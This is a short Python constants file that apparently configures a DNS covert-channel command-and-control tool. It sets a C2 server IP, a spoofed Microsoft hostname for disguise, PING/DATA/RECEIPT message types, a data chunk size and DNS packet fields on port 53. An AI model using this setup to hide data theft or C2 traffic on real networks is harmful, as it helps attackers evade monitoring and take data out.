""" App Constants """

REQUEST_TYPE_ERR = "The request type must be one of the following: PING, DATA, RECEIPT"
PING_INTERVAL = 10

INTERFACE = "ens3"
SNIFF_FILTER = "src port 53"

CC_SERVER_SPOOFED_HOST = "cp501-prod.do.dsp.microsoft.com"
CC_SERVER_IP = "130.245.170.221"

DATA_CHUNK_SIZE = 255

PACKET_OPTIONS = {
    "UDP": {
        "SPORT": 53,
        "DPORT": 53
    },

    "DNS": {
        "QR": 0,
        "QDCOUNT": 1,
        "ANCOUNT": 1,
        "AN": {
            "TYPE": 1
        }
    }
}

